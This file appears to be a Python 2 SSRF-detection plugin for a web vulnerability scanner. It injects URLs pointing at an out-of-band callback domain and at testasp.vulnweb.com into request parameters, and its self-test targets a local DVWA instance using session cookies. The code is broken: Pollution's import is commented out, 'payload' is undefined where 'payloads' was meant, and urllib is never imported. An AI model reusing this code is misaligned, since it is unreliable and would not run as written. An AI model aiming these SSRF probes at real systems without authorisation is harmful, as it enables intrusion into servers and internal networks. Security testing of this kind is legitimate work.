#!/usr/bin/env python
# -*- encoding: utf-8 -*-

from lib.common import *
from config import *
# from URLPollution.urlpollution import Pollution
import urlparse

def check(url, method, data, headers):
    return True

def check_vul(html):
    try:
        keywords = [
                    get_remote_keyword(),#BugScan
                    '63c19a6da79816b21429e5bb262daed863c19a6da79816b21429e5bb262daed8',#AWVS
                    'prompt(98589956)',#AWVS
                   ]
        for keyword in keywords:
            if keyword in html:
                return True
        return False
    except Exception, e:
        pass

def md5_log(url, data, _hash):
    if _hash in url:
        if data != '':
            s = url + '\n\n' + data
        else:
            s = url
        Md5 = md5(s)
        url = url.replace(_hash,Md5)
        s = s.replace(_hash,Md5)
        InLog(Md5, s)
        return url, data
    elif _hash in data:
        s = url + '\n\n' + data
        Md5 = md5(s)
        data = data.replace(_hash,Md5)
        s = s.replace(_hash,Md5)
        InLog(Md5, s)
        return url, data
    else:
        return url, data

def run(url, method, data, headers, proxy_headers=None):
    try:
        VUL = False
        # host = urlparse.urlparse(url).netloc
        parsed_url = urlparse.urlparse(url)
        host = parsed_url.netloc
        query = parsed_url.query

        domain = get_remote_domain()
        _hash = 'eea1ef8416e58543'
        payloads = [
                    'http://{0}.{1}/ssrf.jpg'.format(_hash, domain),
                    '{0}.{1}'.format(_hash, domain),
                    'http://testasp.vulnweb.com/t/fit.txt',
                    'http://testasp.vulnweb.com/t/xss.html',
                   ]
        url = url.encode('utf-8')
        data = data.encode('utf-8')
        headers = get_headers(url, method, data, headers, proxy_headers)
        if method == 'GET':
            # urls = Pollution(payloads).payload_generator(url, append=False)
            query_dicts = Pollution(query, payload).payload_generate()
            urls = []
            for d in query_dicts:
                u = urlparse.urlunsplit((parsed_url.scheme, parsed_url.netloc,parsed_url.path,'',urllib.urlencode(d), parsed_url.fragment))
                urls.append(u)
            for url in urls:

                code, head, html = http_request_get(url, headers=headers)
                if check_vul(html):
                    url, data = md5_log(url, '', _hash)
                    VUL = url
                    break
        else:
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            # urls = Pollution(payloads).payload_generator(url, append=False)
            query_dicts = Pollution(query, payload).payload_generate()
            urls = []
            for d in query_dicts:
                u = urlparse.urlunsplit((parsed_url.scheme, parsed_url.netloc,parsed_url.path,'',urllib.urlencode(d), parsed_url.fragment))
                urls.append(u)

            for _url in urls:

                code, head, html = http_request_post(_url, data, headers=headers)
                if check_vul(html):
                    VUL = _url + '\n\n' + data
                    _url, data = md5_log(_url, data, _hash)
                    break
            if not VUL:
                # datas = Pollution(payloads).payload_generator(data, append=False)
                datas = Pollution(query, payload).payload_generate()
                # urls = []
                # for d in query_dicts:
                #     u = urlparse.urlunsplit((parsed_url.scheme, parsed_url.netloc,parsed_url.path,'',urllib.urlencode(d), parsed_url.fragment))
                #     urls.append(u)
                for data in datas:
                    url, data = md5_log(url, data, _hash)
                    code, head, html = http_request_post(url, data, headers=headers)
                    if check_vul(html):
                        VUL = url + '\n\n' + data
                        break
        if VUL:
            return {'target':host, 'type':'SSRF Injection', 'info':VUL}
    except Exception, e:
        pass

def verify(task):
    message = {
        "method": "",
        "url" : "",
        "param" : "",
        "type" : "ssrf",
        "info" : "[ssrf]",
    }
    url = task['url']
    method = task['method']
    headers = task['request_header']
    data = task['request_content'] if method == 'POST' else None


    result = run(url, method, data, headers)
    if result:
        message['method'] = method
        message['url'] = url
        message['param'] = result['info']
        save_to_databases(message)
        result = (True, message)
    else:
        result = (False, {})
    return result


if __name__ == '__main__':
    task = {
        'url': 'http://127.0.0.1:8000/vulnerabilities/sqli/?id=1&Submit=Submit#',
        'request_header': {
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-GB,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Referer': 'http://127.0.0.1:8000/vulnerabilities/exec/',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': 'sessions=%7B%7D; csrftoken=71w812VAMB8nvVNcYgOmwW6ftN8igDyZsqE9FHz2MsGdQpgdmwpl1jzG2iE7YwLZ; sessionid=x4phtuh6qv5zhpcu46v1xlszto8pbib1; PHPSESSID=ktd1uec9ekucj6afr284i5bks6; security=low; hibext_instdsigdipv2=1; GUID=LgyzlhQfEaDsb0uiyhiN',
        },
        'request_content': '',
        'method': 'GET'
    }
    print verify(task)
